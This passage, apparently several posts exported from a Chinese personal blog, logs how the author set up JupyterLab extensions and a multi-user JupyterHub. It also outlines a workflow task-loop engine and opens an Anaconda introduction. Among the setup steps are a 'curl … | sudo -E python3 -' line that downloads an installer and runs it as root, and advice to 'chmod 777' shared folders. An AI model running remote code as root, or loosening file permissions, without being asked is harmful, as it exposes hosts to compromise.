在命令行使用jupyter-lab或jupyter lab命令运行Jupyter lab\n作为官方宣传的jupyter lab3.0版本后最大的改变，似乎我们可以不需要nodejs，不通过jupyter labextension install语句，仅仅依靠pip/conda/mamba就可以安装拓展\n1 pip install \u0026#34;jupyterlab-kite\u0026gt;=2.0.2\u0026#34; Jupyter Lab配置\n使用命令创建配置文件，其会生成C:\\Users\\用户名\\.jupyter\\jupyter_notebook_config.py或者/home/用户名/.jupyter/jupyter_notebook_config.py\n1 jupyter lab --generate-config 控制台出现的各种警告 安装插件后出现警告“Config option template_path not recognized by LenvsLatexExporter”\n原因是nbconvert6.0.0版本以上的某些参数的名称发生了更改，与原先版本不兼容，需要将版本降低到5.6.1\n1 pip install nbconvert==5.6.1 -i https://pypi.mirrors.ustc.edu.cn/simple ClobberError: This transaction has incompatible packages 或者The package ‘xxx‘ cannot be installed due==（未解决）==\n原因：conda和pip等相关包的版本太低，自动更新不能用。 解决方案：在命令行中输入以下命令：==（没效果）==\n1 2 conda clean --all conda update --all Failed validating \u0026lsquo;additionalProperties\u0026rsquo; in schema:==（未解决）==\nWARNING | Config option kernel_spec_manager_class not recognized by LabBuildApp==（未解决）==\n如果出现\n可以先更新pip\n1 python -m pip install --upgrade pip 插件 强烈推荐JupyterLab 6个\u0026quot;精英\u0026quot;插件\n15个好用到爆炸的Jupyter Lab插件\n==nodejs版本不能过低==\n同时！！\n==外部的node环境好像不生效，要在conda环境中装node==\n在anaconda prompt中运行下面的语句安装nodejs：\nconda install -c conda-forge nodejs\u0026lt;15\n其次需要注意的一点是：nodejs最好选择14.x.x版本，如果选择了16.x.x可能会遇到各种奇葩问题 。（这是个大坑）\n还有，建议用官方默认源来下载npm资源，yarn同理。别用taobao的源。\ntaobao的源有些不对，也会导致资源下载不成功。而且taobao在2022年5月要改域名了。\n1.jupyterlab-code-snippets（没安装成功）\n1 jupyter labextension install jupyterlab-code-snippets 报错：\n==外部的node环境好像不生效，要在conda环境中装node==\n==遇到的问题：==\n安装之后无法使用\n解决方法：\nelyra-code-snippet-extension（安装成功）\n1 pip install elyra-code-snippet-extension 如果出现\n可以先更新pip\n1 python -m pip install --upgrade pip 1 conda install -c conda-forge elyra-code-snippet-extension \u0026amp;\u0026amp; jupyter lab build 👆命令装不了\n==控制台安装出错==\n==页面安装出错==\ncode snippets存储路径：$JUPYTER_DATA_DIR/metadata/code-snippets\n1 $ jupyter --data-dir 2.jupyter lsp（安装成功）\njupyter lab 代码提示 代码补全插件 jupyter lsp 配置教程 ：Hinterland mode\n1.安装JupyterLab-lsp\n1 pip install jupyter-lsp 2.安装python-lsp-server\n1 pip install python-lsp-server[all] 3.安装frontend extension\n1 jupyter labextension install @krassowski/jupyterlab-lsp 3.或者启动 jupyter lab，在插件中搜索lsp，点击@krassowski/jupyterlab-lsp下的install安装\n4.点击OK\n5.重新进入jupyter lab，输入代码时按tab键，就可以使用代码提示啦 。\n若想实现jupyter notebook中类似Hinterland mode的自动提示，还需进行下面的设置\n6.依次点击Settings\u0026ndash;\u0026gt;Advanced Settings Editor\n7.选择Code Completion，在右侧输入如下代码，并保存，即可开启Hinterland mode\n1 2 3 { \u0026#34;continuousHinting\u0026#34;: true } ==可能会出现如下问题：==\n3.ipywidgets（安装成功）\n生成控件(下拉菜单, 滑条等等), 非常方便手动调参, 因为会即使反馈, 根据反馈不断调整参数\n先用pip安装ipywidgets: pip install ipywidgets\n用这个命令（指定为版本7）：pip install ipywidgets==7\n这样安装会出现如下问题：\n**解决方法（这个方法没解决）：**https://www.coder.work/article/3135992\nipywidget 7.5 破坏了 jupyter lab，它也影响了其他库。\nhttps://github.com/plotly/plotly.py/issues/1659\n降级到 7 解决\n安装完成后在Jupyter Notebook中激活：\n1 jupyter nbextension enable --py widgetsnbextension 如果使用Jupyterlab，运行以下代码：\n1 jupyter labextension install @jupyter-widgets/jupyterlab-manager 在Notebook中导入并使用ipywidgets：\n1 2 import ipywidgets as widgets from ipywidgets import interact, interact_manual 交互式控件入门\n假设我们有一个数据框(dataframe)，包含Medium文章的统计信息：\n如何查看总阅读次数超过1000的文章？\n1 df.loc[df[\u0026#39;reads\u0026#39;] \u0026gt; 1000] 如果要显示点赞超过500的文章，必须编写一行新的代码：\n1 df.loc[df[\u0026#39;claps\u0026#39;] \u0026gt; 500] 如果不用编写更多代码就可以快速更改这些参数，那不是很好吗？尝试ipywidgets：\n1 2 3 @interact def show_articles_more_than(column=\u0026#39;claps\u0026#39;, x=5000): return df.loc[df[column] \u0026gt; x] 4.jupyterlab_variableinspector（安装成功）\njupyterlab-variableInspector帮助我们在jupyter lab中查看当前环境中存在的变量相关信息，以美观的界面形式对多种类型的对象予以呈现\n1 2 3 4 conda config --add channels conda-forge conda config --set channel_priority strict conda install jupyterlab-variableinspector 如果遇到Solving environment: failed with initial frozen solve. Retrying with flexible solve.参考下面这个博客\nhttps://blog.csdn.net/Sakura_Logic/article/details/108312146\n👇方式安装失败\n1 jupyter labextension install @lckr/jupyterlab_variableinspector ==这个插件build会失败==\n5.代码折叠\n设置如下：codeFolding：true，即可见代码折叠\n6.kite（没安装成功）\nkite插件是能够对代码块进行自动补充和对函数参数进行解释的插件。\n1 pip install \u0026#34;jupyterlab-kite\u0026gt;=2.0.2\u0026#34; 安装出错：缺少对应的wheel\n启动时出错\n7.elyra（未安装）\n搭建工作流\nelyra——jupyter lab平台最强插件集\n8.jupyterlab_code_formatter（安装成功）\n1 conda install -c conda-forge jupyterlab_code_formatter 或使用jupyter页面安装\n如果python版本过高会无法使用\n**解决方法：**运行jupyter server extension enable --py jupyterlab_code_formatter并重启jupyter lab\nJupyterHub JupyterHub有两种部署方式：\nThe Littlest JupyterHub Zero to JupyterHub with Kubernetes When to use The Littlest JupyterHub\n安装 安装教程：\nQuickstart\njupyterhub 安装教程\n1.安装miniconda\nhttps://www.jianshu.com/p/47ed480daccc\n解决方案：\n打开一个终端，然后输入命令行打开bashrc文件：\n1 sudo gedit ~/.bashrc 注意这里要有sudo，不然无法编辑里面的内容。\n打开自己的安装目录/opt/software/miniconda3/bin，输入指令pwd查看路径。\n在bashrc文件中输入：\n1 export PATH=\u0026#34;/opt/software/miniconda3/bin:$PATH\u0026#34; 保存关闭bashrc文件，在命令行输入：\n1 source ~/.bashrc 随后检测一下：\n1 conda --version 如上图所示，成功。\n2.安装JupyterHub\npip, npm:\n1 2 3 python3 -m pip install jupyterhub npm install -g configurable-http-proxy python3 -m pip install jupyterlab notebook # needed if running the notebook servers in the same environment 建立软连接\n1 ln -s /opt/software/node-v14.8.0-linux-x64/bin/configurable-http-proxy /usr/bin/configurable-http-proxy conda (one command installs jupyterhub and proxy):\n1 2 conda install -c conda-forge jupyterhub # installs jupyterhub and proxy conda install jupyterlab notebook # needed if running the notebook servers in the same environment 测试是否安装成功\n1 2 jupyterhub -h configurable-http-proxy -h 3.启动jupyterhub\n命令行输入\n1 jupyterhub 浏览器输入http://localhost:8000(localhost可换成服务器ip)，通过服务器的用户登录（非root，root默认是无法登录的）\n==遇到的问题：==\n使用pip安装启动jupyterhub时，找不到 \u0026lsquo;configurable-http-proxy\u0026rsquo;\n建立软连接\n1 ln -s /opt/software/node-v14.8.0-linux-x64/bin/configurable-http-proxy /usr/bin/configurable-http-proxy 多用户需求 Get Started\n多用户多环境Jupyter notebook解决方案\n[Centos/Jupyterhub] 多用户远程登录 Jupyter 详细配置\nAuthentication and User Basics\n安装 JupyterHub 踩坑指南 —— 如何通过 JupyterHub 实现多用户管理\n默认情况下，要真正的实现分配用户账号，需要满足以下两点要求：\nc.Authenticator.whitelist 指定了用户名 在系统中创建了该用户（adduser / useradd） tips: 默认情况下，密码为系统中该用户对应的密码\nJupyterHub支持多种Spawner，可以启动LocalProcess（默认）的JupyterLab，docker容器版的JupyterLab，也可以启动Kubernetes(k8s)集群Pod版的JupyterLab、Hadoop Yarn上的JupyterLab等等。\n针对测试或者自己单用户使用，默认的LocalProcess就可以；若多用户不是很多，隔离性也没那么高要求的，LocalProcess也能满足；如果有意向大量不确定用户提供，还是使用docker容器或者k8s版本的比较好，隔离性好，也能限制资源用量。\n新增用户 每个用户的环境都是独立的\npip install都是安装在 /home/用户/.local/lib/python3.7/site-packages/下\n登录 ==登录时遇到的问题：==\n登录普通用户的时候日志报错\n在输入node -v 时显示未找到命令，而且 configurable-http-proxy 也没了\n软连接失效\n删除软连接，新建软连接，==手动输入==\n==解决方法：新建一个环境！！！重复上述操作==\n配置文件设置 生成配置文件\n1 jupyterhub --generate-config 这个命令会在你的当前目录下生成一个jupyterhub_config.py文件，接下来我们需要在这个文件中配置我们的网络和用户管理。（建议放在编撰的UNIX文件系统位置：/etc/jupyterhub）\n1 jupyterhub -f /etc/jupyterhub/jupyterhub_config.py 上述命令可以根据你的配置文件启动jupyterhub。\n在存放jupyterhub_config.py的文件夹下执行jupyterhub启动服务\n配置 jupyterhub_config.py\n1 c.Spawner.notebook_dir = \u0026#39;/home/cqb/jupyter_workspace\u0026#39; #jupyterhub自定义目录 c.Spawner.notebook_dir设置之后新建工程出现Permission denied: 未命名.ipynb\n==解决方法：==\n修改该文件夹的权限：chmod 777 jupyter_workspace/\n1 2 chmod 770 jupyter_workspace/ chmod +s jupyter_workspace/ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # c.Spawner.default_url = \u0026#39;/lab\u0026#39; # /lab对应jupyterlab 默认为notebook # c.JupyterHub.port = 80 # 指定暴露端口 c.Authenticator.allowed_users = {\u0026#39;user1\u0026#39;, \u0026#39;user002\u0026#39;, \u0026#39;user003\u0026#39;} # 指定可使用用户 # PAMAuthenticator.whitelist is deprecated in JupyterHub 1.2, use PAMAuthenticator.allowed_users instead c.LocalAuthenticator.create_system_users = True c.Authenticator.admin_users = {\u0026#39;root\u0026#39;, \u0026#39;cqb\u0026#39;} # 指定admin用户 # c.JupyterHub.statsd_prefix = \u0026#39;jupyterhub\u0026#39; # c.Spawner.cmd=[\u0026#39;jupyterhub-singleuser\u0026#39;] c.Spawner.notebook_dir = \u0026#39;~/jupyter_workspace\u0026#39; # 每个用户有单独的工作空间(但是前提是需提前创建好文件夹) # c.LocalAuthenticator.group_whitelist = {\u0026#39;group1\u0026#39;} # c.JupyterHub.statsd_prefix = \u0026#39;jupyterhub\u0026#39; # 为jupyterhub 添加额外服务，用于处理闲置用户进程。安装jupyterhub-ilde-culler：pip install jupyterhub-ilde-culler（jupyterhub-ilde-culler安装不了） c.JupyterHub.services = [ { \u0026#39;name\u0026#39;: \u0026#39;idle-culler\u0026#39;, \u0026#39;command\u0026#39;: [\u0026#39;python3\u0026#39;, \u0026#39;-m\u0026#39;, \u0026#39;jupyterhub_idle_culler\u0026#39;, \u0026#39;--timeout=3600\u0026#39;], \u0026#39;admin\u0026#39;:True # 1.5.0 需要服务管理员权限，去kill 部分闲置的进程notebook, 2.0版本已经改了，可以只赋给 idel-culler 部分特定权限，roles } ] 设置管理员，管理员能够查看和启停所有用户的servers\n1 c.Authenticator.admin_users = set([\u0026#39;admin\u0026#39;]) 设置普通用户，管理员用户不需要加入白名单\n1 c.Authenticator.whitelist = set([\u0026#39;user1\u0026#39;, \u0026#39;user2\u0026#39;, \u0026#39;user3\u0026#39;]) 注意事项\n==须在root管理员下启动jupyterhub，才可以实现多用户（否则会出现权限不足和有些用户无法登录的情况）==；\n==user1登录失败==\n没有权限访问jupyter_workspace文件夹 No such notebook dir: '/home/cqb/jupyter_workspace'\n工作空间配置 工作空间分为共享工作空间（多用户共用一个文件夹）或者是用户独享工作空间\n共享工作空间 共享的话要配置 Linux多用户共同使用同一目录\nhttps://blog.csdn.net/catscanner/article/details/105129846\n例如有alex，bob两个用户，互相无法访问对方的home~文件夹，为了共享文件，可以让root用户在/home中创建一个shared文件夹，然后创建一个用户组dev01\n在root或者sudo下：\n1 groupadd dev01 创建用户组之后添加文件夹并为文件夹更改组\n1 2 mkdir /home/dev_shared chgrp dev01 /home/dev_shared 接下来更改文件夹权限，使得owner以及用户组可以访问,+s是为了确保之后添加进去的文件夹也继承同样的权限\n1 2 chmod 770 /home/dev_shared chmod +s /home/dev_shared 然后将需要共享文件的用户添加到dev01这个用户组\n1 2 usermod -a -G dev01 alex usermod -a -G dev01 bob 注意，使用root环境运行su - ， 而不是root权限su\n至此，两人都可以访问/home/dev_shared文件夹了\n另外，用户可以自行检查自己所在的用户组\n1 groups 如果是全新的账户，root用户可以先建立新用户：\n1 2 useradd alex passwd alex 使用root权限查看所有的group情况\n1 cat /etc/group 独享工作空间 独享的话配置文件设置 c.Spawner.notebook_dir = '~/jupyter_workspace' 每个用户的文件会放在/home/user/jupyter_workspace下\n==遇到的问题：==\n创建文件的时候报错Permission denied: '/home/shared/jupyter_workspace/.ipynb_checkpoints/untitled-checkpoint.dio'\n.ipynb_checkpoint文件夹没有写权限，注意这个文件夹是 user1 创建的，其他用户没有写权限，所以==用户共享一个工作空间的方案不可行==\n解决方法：\n1 2 chmod 770 .ipynb_checkpoints chmod +s .ipynb_checkpoints 注意：\n其他用户创建的文件是无法保存的（既然这样子，那其实就没有必要让用户共享工作空间，因为文件并不能被修改，可以用户拥有自己的工作空间，同时创建一个共享文件夹，用户将需要共享的文件放到该共享文件夹让对方调用）\n用户安装插件 只能使用 pip install 安装\n用户登录的时候通过pip install都是安装在 /home/用户/.local/lib/python3.7/site-packages/下的，各用户的环境都是隔离的\n因为只允许非root用户登录\n无法通过conda install安装，因为安装目录是在 /opt/software/miniconda3/envs/jupyterhub1 ，用户无写权限\n同样的，插件在web界面也是无法进行安装的（conda install无权限）\n若是允许用户安装插件，可将插件安装所在文件夹共享出来，指定特定的组权限可写\n1 2 3 4 chgrp -R shared /opt/software/miniconda3/envs/jupyterhub chmod -R 775 /opt/software/miniconda3/envs/jupyterhub chmod -R +s /opt/software/miniconda3/envs/jupyterhub ==遇到的问题：==\n文件权限设置完成后，通过命令安装插件\n1 !conda install -c conda-forge jupyterlab-drawio -y ==输入上面这个命令之后jupyterhub就启动不起来了！！！****==\nnode:error while loading shared libraries: libnode.so.83\nerror while loading shared libraries的解決方法\n==解决思路：==\n输入node -v可以看到同样的错误，可能是安装的node有问题，把之前通过pip安装的node卸载掉==（pip和conda 安装的都要卸载掉）==，通过tar包重新安装\n重新安装建立软连接后是可以输入node -v，但是安装jupyterhub之后他会自带一个nodejs，还是会报错\n猜测的原因是conda 安装的jupyterhub自带的nodejs可能有问题\n通过pip的方式安装jupyterhub可以解决该问题\nLinux 上安装 Node.js 1 2 3 wget https://nodejs.org/dist/v14.8.0/node-v14.8.0-linux-x64.tar.gz // 下载 tar -xzvf node-v14.8.0-linux-x64.tar.gz // 解压 cd node-v14.8.0-linux-x64 // 进入解压目录 ==下面这个修改配置文件的方法不能生效==\n解压文件的 bin 目录底下包含了 node、npm 等命令，我们可以修改linux系统的环境变量（profile）来设置直接运行命令：\n老规矩先备份，养成修改重要文件之前先备份的好习惯。\n1 cp /etc/profile /etc/profile.bak 然后 vim /etc/profile，在最下面添加 export PATH=$PATH: 后面跟上 node 下 bin 目录的路径\n1 export PATH=$PATH:/opt/software/node-v14.8.0-linux-x64/bin 立即生效\n1 2 3 source /etc/profile [root@localhost ~]# node -v v14.8.0 OK！安装成功！\n==建立软连接才能生效==\n1 2 3 4 5 6 root@qingbin-virtual-machine:/opt/softeware# ln -s /opt/softeware/node-v14.8.0-linux-x64/bin/node /usr/local/bin/ root@qingbin-virtual-machine:/opt/softeware# node -v v14.8.0 root@qingbin-virtual-machine:/opt/softeware# ln -s /opt/softeware/node-v14.8.0-linux-x64/bin/npm /usr/local/bin/ root@qingbin-virtual-machine:/opt/softeware# npm -v 6.14.7 删除软连接：\n进入软连接目录\nrm ./node\n==遇到的问题：==\n直接通过web在插件模块install的话会出现如下错误，但是我启动jupyterhub的环境下已经安装了nodejs了，不知道为什么会出现该错误\n解决方法：\n在linux中自己安装node，不要用自带的node环境\n阿里天池的环境安装解决方案 阿里天池可以通过 pip install 安装环境/插件（python环境安装在/data/nas/workspace/envs/python3.6/site-packages/）\n阿里天池也没有办法通过插件模块install安装\n阿里天池也没有办法用命令!conda install -c conda-forge jieba -y安装环境\n阿里天池也没有办法用命令!conda install -c conda-forge jupyterlab-drawio -y安装插件\nColab的环境安装解决方案 可通过pip install安装环境（python环境安装在/usr/local/lib/python3.7/dist-packages/），但是无法通过conda install，没有安装插件的模块\n==Colab可以在输出端输入y执行之后的操作，但是阿里天池不可以==\nColab\n阿里天池\nThe Littlest JupyterHub The Littlest JupyterHub currently supports Ubuntu(18.04) Linux only\n每个 JupyterHub 用户都会在首次启动服务器时创建自己的 Unix 用户帐户。这可以保护用户彼此之间，在/home为他们提供一个主目录，并允许基于文件系统权限进行共享。\n安装TLJH The Littlest JupyterHub\n【TLJH】the-littlest-jupyterhub国内搭建和配置详细教程\nconda 阿里源_Littlest JupyterHub| 01 Littlest JupyterHub 阿里云搭建\n1.确保python3, python3-dev, curl 和 git 都已经安装\n1 sudo apt install python3 python3-dev git curl 2.安装\n下面这个安装不了，因为代码里面有GitHub的地址，下载很慢\n1 curl -L https://tljh.jupyter.org/bootstrap.py | sudo -E python3 - --admin \u0026lt;admin-user-name\u0026gt; ==遇到的问题：==\n启动报错\n安装程序都做了些什么 What does the installer do?\nTLJH创建的目录需要root权限/opt/tljh\nHub的环境安装在/opt/tljh/hub下，同时还包含了traefik（Træfik 是一个为了让部署微服务更加便捷而诞生的现代HTTP反向代理、负载均衡工具。 它支持多种后台 (Docker, Swarm, Kubernetes, Marathon, Mesos, Consul, Etcd, Zookeeper, BoltDB, Rest API, file…) 来自动化、动态的应用它的配置文件设置）\n用户环境安装在 /opt/tljh/user，这包含用于启动所有用户的notebook接口，以及所有用户可用的各种包。这个环境归root用户所有。\n不使用JupyterHub的原因 Jupytherhub的每个用户都是一个linux的用户，每个用户之间基于文件系统权限进行共享，用户的操作权限基本是遵循linux的规范，这不方便我们对用户的控制，开发环境、文件的管理与共享\nJupyter集成的应用 集成Jupyter notebook的工具或平台\n==集成的是Jupyter lab，通过Docker实现的，将一个外部目录挂载到容器中==\n阿里天池大数据 如何在天池学习、运行教程代码\nGoogle Colab https://colab.research.google.com/\nJupyter二次开发 重点:JupyterLab深度定制开发实践\n文件系统：glusterfs\n用户权限：目前我们的Jupyter没有使用jupyterHub来管理用户权限，主要是我们的模式是==每个用户启动一个docker容器的jupyterLab服务==，每个人使用自己的jupyterLab服务，互相不会有干扰，而且JupyterLab我们定义为用户的IDE和工作平台，所以独立容器保证了独立性，也方便后续用户资源计费。在此架构下，==jupyterlab token作为用户认证主要途径，在jupyterLab系统启动时，会将用户的token存储到user service的用户表字段中==，前端页面跳转jupyterlab web UI时，会去user service获取该用户的jupyterLab token，根据此token登录jupyterLab服务，完成认证。 而==目录权限的控制，主要是不同的用户和机构目录挂载到不同的目录==。对于hadoop的访问权限控制，我们会把kerberos/ranger相关配置集成到了app中，并且jupyterLab服务和livy服务都会使用对应的用户USER ID来启动。\nJuypter Notebook 前端二次开发\nJupyter Notebook二次开发的经验（一）——安装开发版本\nJupyter生态二次开发系列(一)\nJupyterHub+Lab：Ubuntu18.04搭建自己的多用户云notebook（安装篇）\nJupyter NoteBook / JupyterLab / JupyterHub 区别与关系简介\n搭建环境方案（根据需求调整）：\n线上环境：The Littlest JupyterHub + JupyterLab 开发环境：JupyterHub + JupyterLab 不管是Jupyter Notebook还是Jupyter Lab，都是只支持单用户的使用场景，作为一个可交互的web服务，所有用户都在同一个目录下操作（甚至同时在编辑同一个脚本），多数情况下很不方便。Jupyterhub可以解决这个问题。 但是当我们把Jupyterhub安装，启动服务后默认确实JupyterNoteBook，如何换成JupyterLab呢？👇\nJupyterLab on JupyterHub(JupyterLab+JupyterHub)（JupyterLab JupyterHub）\n思路 1.数据用Drive单独存储\n2.写函数库让用户调用\n例如：from google.colab import files\n1 2 3 4 5 6 from google.colab import files with open(\u0026#39;example.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(\u0026#39;some content\u0026#39;) files.download(\u0026#39;example.txt\u0026#39;) 3.示例代码段\n4.ipynb工程分享\nhttps://colab.research.google.com/drive/131SUrBstRNKv6n4GtK582ULCEjVaV1V9?usp=sharing\n5.ipywidgets调参\n6.服务的发布与共享\n7.互操作引擎\n问题收集 1.运行代码的时候出现错误，弹框提示内核似乎挂掉了，它很快将自动重启。\n**解决：**出现这种情况的时候，需要将虚拟环境中的包全部用conda命令进行安装，用pip安装就会出现这个问题（把用pip安装的包删了重新用conda装：conda install -c conda-forge wordcloud）\n","permalink":"https://chance7bin.github.io/posts/note/jupyter/","summary":"Jupyter初探 Jupyter Notebook介绍、安装及使用教程 Jupyter使用详解 Jupyter notebook安装 安装了Anaconda发行版时已经自动安","title":"Jupyter"},{"content":"引言 设计工作流的目的：\n实现模型的自动化执行：对于一个需要繁琐步骤，通过多种方法计算的需求来说，通过构建工作流，可以省去一些重复的工作\n实现模型的并行化计算：对于一整个计算流程来说，有些计算是可以一起执行的，因此可以根据计算的先后顺序构建出一整个计算流程，缩短一整个计算流程的运行时间\n工作流是一种为满足数据收集、处理、计算、分析需求，按照流程之间的逻辑关系进行描述并使用计算机完成自动或半自动流程运行的过程。\n工作流模型 工作流的执行传递依赖于流程中的数据流，单元与单元之间的依赖关系实际上是一种输入输出数据之间的有向传递关系\n构建工作流时，各计算单元是按一定逻辑组织的，流程中包含顺序、选择、迭代等逻辑结构，各个元素的执行顺序也有先后，需要对流程的运转进行控制。\n在对流程完成定义和构建之后，工作流需要对工作流流程进行分析，对流程中过程进行验证。根据其中的逻辑关系对执行先后顺序进行控制；并针对各功能单元进行解析，对包含计算任务的单元进行调度与运行。\n各计算节点的元素关系 1）串行关系\n2）并行关系\n3）分支关系\n4）选择关系\n5）迭代关系\n结构化描述文档 结构化描述模块示意图\n结构化描述文档\n工作流对象类图\n浏览器的Event Loop 参考链接：\nhttps://juejin.cn/post/7079092748929728548#comment\nJS是单线程还是多线程的？ 答案：JS是单线程。如果您深究为什么是单线程的呢？\n其实这是与它的用途有关，因为JS是一门浏览器脚本语言，主要用途是进行用户操作和操作DOM，所以它只能是单线程的，否则会带来很多复杂的同步问题。\n浏览器是多进程还是单进程 答案：浏览器是多进程的。为什么说是多进程的？ 你说是就是吗？ 凭什么呢？\n当我们浏览网页的时候，有的时候是不是会遇到浏览器卡死的情况。如果我们开了多个会话，就假如我们一边刷力扣，一边开发程序，写循环的时候，写了一个死循环，导致了我们开发的这个会话的崩溃，如果浏览器是单进程的情况下，力扣这个时候也会崩溃。\n当然浏览器肯定不会允许这样的事情发生，它就是多进程的，多个会话互相不影响\n事件循环 首先js代码先执行主线程的代码，也就是同步的代码，从上至下，遇到异步代码交给浏览器，浏览器专门开了一个线程，其中浏览器线程中维护这两个队列，一个微任务队列，一个宏任务队列。\n宏任务队列 Macrotask Queue: ajax、setTimeout、setInterval、Dom监听等 微任务队列 Microtask Queue: Promise的then回调、 Mutation Observer API、queueMicrotask 注意:每一次执行宏任务之前，都是要确保我微任务的队列是空的，也就是说从代码执行的顺序来说微任务优先于宏任务。\n但是存在插队的情况，也就是说当我微任务执行完了，要开始执行宏任务了（有多个宏任务），宏任务队列当队列中的代码执行了，宏任务队列里面又有微任务代码，又把微任务放入到微任务队列当中。\n此时特别注意！！！从严格的意义来说，紧接着是先进行编译的宏任务，但是此时微任务里面有任务，才去执行的微任务队列，而不是直接去执行的。这些异步的代码交给js执行，这样三者形成了一个闭环，我们称之为事件循环。\n流程运行控制引擎 元素执行控制 任务循环机制 借鉴chrome v8等浏览器引擎事件循环（Event Loop）的成熟策略，设计了基于任务循环（Task Loop）的流程运行并发模型和运转控制策略。Task Loop维护一个运行控制线程，核心是队列维护方法query。query维护四个队列，分别对应等待队列waiting list、执行队列running list、完成队列completed list和失败队列failedList，通过对元素进行遍历处理检查状态，并分别压入对应的队列。等待队列中的元素检查数据是否完备、执行条件是否满足，满足则执行；执行队列中的元素向计算节点请求更新状态；完成队列和失败队列则根据各自情况更新输出数据和状态。TaskLoop不断循环，从而检查各个元素状态并更新qurey队列，将条件满足的元素压入执行。而在容错方面，设计了错误滞后策略即多次运行失败认定失败来减小错误影响。\n通过这种控制方法，各个满足执行前提条件的元素可以互不干涉、并发执行，同时将元素的依赖关系和流程的逻辑结构映射为元素的执行条件和数据准备情况，可以满足流程运行控制的要求的前题下简化程序结构、解耦各部分的功能。\n流程说明 （1）每个工作流开辟一个单独的线程不断循环计算（Task Loop）\n（2）每一次循环都遍历等待队列waiting list的所有计算单元，判断其数据是否已经准备完毕（前面步骤是否已经执行完），如果准备完毕则将该计算单元作为任务加入到执行队列running list中，并开始计算（调用服务）\n（3）输入数据的类型分为两种，一种是直接输入（value），一种是前面的流程结果（link），所以在设置输入数据的属性的时候需要根据类型从不同的来源获取到对应的值\n（4）需要迭代的计算单元，对于为link（前面的流程结果）的输入数据，需要重新计算前面流程结果，所以需把关联的计算单元也加入到等待队列waiting list中\n（5）对于条件判断（分支和循环），根据条件的成立与否（true/false）将下一个计算单元加入到等待队列waiting list中\n（6）每个计算单元计算完成后，根据计算状态将计算单元加入到完成队列completed list或失败队列failedList中，输出数据需加入到数据共享池SharedData中，以便后续计算单元从池中获取到前面的计算结果。对于迭代模型，当还未到达最大迭代次数的时候会将当前计算单元重新加入等待队列，同时创建一个临时文件池TempOutput（独立于SharedData），记录最新的运算结果\n（7）当等待队列waiting list以及执行队列running list中没有计算任务时，整个工作流流程结束\n工作流功能实现 工作空间 工作流详情 后端关键代码 Service\n1 2 3 4 5 public String runTask(MultipartFile file, String userName){ // ... TaskLoopHandler taskLoopHandler = new TaskLoopHandler(task); new Thread(taskLoopHandler).start(); } TaskLoopHandler\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public class TaskLoopHandler implements Runnable { private Task task; public TaskLoopHandler(Task task){ this.task = task; } @Override public void run() { TaskLoop taskLoop = new TaskLoop(); // 初始化任务 taskLoop.initTaskRun(task); // 初始化等待队列 List\u0026lt;ModelAction\u0026gt; waitingModels = ((Map\u0026lt;String,List\u0026lt;ModelAction\u0026gt;\u0026gt;)taskLoop.checkActions(task).get(\u0026#34;model\u0026#34;)).get(\u0026#34;waiting\u0026#34;); while (true){ taskLoop.query(waitingModels, task); Map\u0026lt;String, Object\u0026gt; checkedList = taskLoop.checkActions(task); waitingModels = ((Map\u0026lt;String,List\u0026lt;ModelAction\u0026gt;\u0026gt;)taskLoop.checkActions(task).get(\u0026#34;model\u0026#34;)).get(\u0026#34;waiting\u0026#34;); if(taskLoop.finalCheck(task)){ log.info(\u0026#34;全部运行结束\u0026#34;); break; } } log.info(\u0026#34;线程结束\u0026#34;); } } TaskLoop\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 public class TaskLoop { ConcurrentHashMap\u0026lt;String, ShareData\u0026gt; tempOutput; // 临时数据池 ConcurrentHashMap\u0026lt;String, ShareData\u0026gt; shareData; // 共享数据池 // 将准备好的任务推入running list public int query(List\u0026lt;ModelAction\u0026gt; waitingModels, Task task){ int result = 0; for(int i=0;i\u0026lt;waitingModels.size();i++){ ModelAction modelAction = waitingModels.get(i); // 检查数据是否准备好 if(checkData(modelAction,task)){ runModel(modelAction); } } return result; } // 检查集成任务中的所有任务状态 public Map\u0026lt;String,Object\u0026gt; checkActions(Task task) { checkModels(task); // ... } // 检查task中的单模型状态 public Map\u0026lt;String,List\u0026lt;ModelAction\u0026gt;\u0026gt; checkModels(Task task){ Map\u0026lt;String,List\u0026lt;ModelAction\u0026gt;\u0026gt; result = new HashMap\u0026lt;\u0026gt;(); List\u0026lt;ModelAction\u0026gt; waitingModel = new ArrayList\u0026lt;\u0026gt;(); // 等待队列 List\u0026lt;ModelAction\u0026gt; completedModel = new ArrayList\u0026lt;\u0026gt;(); // 完成队列 List\u0026lt;ModelAction\u0026gt; runningModel = new ArrayList\u0026lt;\u0026gt;(); // 执行队列 List\u0026lt;ModelAction\u0026gt; failedModel = new ArrayList\u0026lt;\u0026gt;(); // 失败队列 // 一系列操作 checkXxx(); // 检查 updateXxx(); // 更新 judgeCondition(); // 条件判断 // ... result.put(\u0026#34;waiting\u0026#34;,waitingModel); result.put(\u0026#34;running\u0026#34;,runningModel); result.put(\u0026#34;completed\u0026#34;,completedModel); result.put(\u0026#34;failed\u0026#34;,failedModel); } } 前端关键代码 前端使用mxGraph实现\n","permalink":"https://chance7bin.github.io/posts/design/%E5%B7%A5%E4%BD%9C%E6%B5%81%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/","summary":"引言 设计工作流的目的： 实现模型的自动化执行：对于一个需要繁琐步骤，通过多种方法计算的需求来说，通过构建工作流，可以省去一些重复的工作 实现模型","title":"工作流设计与实现"},{"content":"Anaconda指的是一个开源的python发行版本，其包含了conda、Python等180多个科学包及其依赖项。\nAnaconda是一个开源的包、环境管理器，可以用于在同一个机器上安装不同版本的软件包及其依赖，并能够在不同的环境之间切换。\nconda介绍 conda 是开源包（packages）和虚拟环境（environment）的管理系统。\npackages 管理： 可以使用 conda 来安装、更新 、卸载工具包 ，并且它更关注于数据科学相关的工具包。在安装 anaconda 时就预先集成了像 Numpy、Scipy、 pandas、Scikit-learn 这些在数据分析中常用的包。另外值得一提的是，conda 并不仅仅管理Python的工具包，它也能安装非python的包。比如在新版的 Anaconda 中就可以安装R语言的集成开发环境 Rstudio。 虚拟环境管理： 在conda中可以建立多个虚拟环境，用于隔离不同项目所需的不同版本的工具包，以防止版本上的冲突。纠结Python 版本时，可以建立 